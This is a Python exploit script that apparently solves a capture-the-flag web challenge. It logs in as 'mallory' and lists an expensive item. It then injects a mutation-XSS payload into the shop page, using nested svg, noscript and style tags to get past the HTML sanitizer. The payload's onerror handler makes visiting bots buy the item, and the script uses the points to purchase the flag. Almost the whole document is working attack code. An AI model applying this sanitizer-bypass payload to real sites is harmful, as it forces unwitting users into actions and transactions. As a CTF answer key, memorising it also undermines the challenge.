import random
import string
import sys
import time

import requests


def rand_suffix(n=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def get_me(session, base_url):
    response = session.get(f"{base_url}/api/auth/me", timeout=15)
    response.raise_for_status()
    return response.json()


def main():
    if len(sys.argv) != 2:
        print(f"usage: python3 {sys.argv[0]} <base_url>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    session = requests.Session()

    response = session.post(
        f"{base_url}/api/auth/login",
        json={"accountId": "mallory", "password": "CPCTF2026"},
        timeout=15,
    )
    response.raise_for_status()

    item_id = f"mxss_{rand_suffix()}"
    response = session.post(
        f"{base_url}/api/shops/mallory/items",
        json={"itemId": item_id, "price": 50_000_000, "content": "totally safe"},
        timeout=15,
    )
    response.raise_for_status()

    payload = (
        "<svg><xss><desc><noscript>"
        "&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>"
        f'&lt;a title="&lt;/style>&lt;img src=1 alt=POST title=/api/items/{item_id}/purchase '
        'onerror=fetch(this.title,{method:this.alt})>">'
    )

    for i in range(10):
        shop_html = payload + ('<p class="shop-notice">.</p>' * i)
        response = session.patch(
            f"{base_url}/api/shops/mallory",
            json={"shopHtml": shop_html},
            timeout=15,
        )
        response.raise_for_status()

        for _ in range(3):
            time.sleep(2)
            me = get_me(session, base_url)
            if me["points"] >= 100_000_000:
                break
        if me["points"] >= 100_000_000:
            break
    else:
        raise RuntimeError("bots did not buy the item in time")

    response = session.post(f"{base_url}/api/items/flag/purchase", timeout=15)
    response.raise_for_status()

    me = get_me(session, base_url)
    for item in me["purchasedItems"]:
        if item["itemId"] == "flag":
            print(item["content"])
            return

    raise RuntimeError("flag item not found in purchased items")


if __name__ == "__main__":
    main()
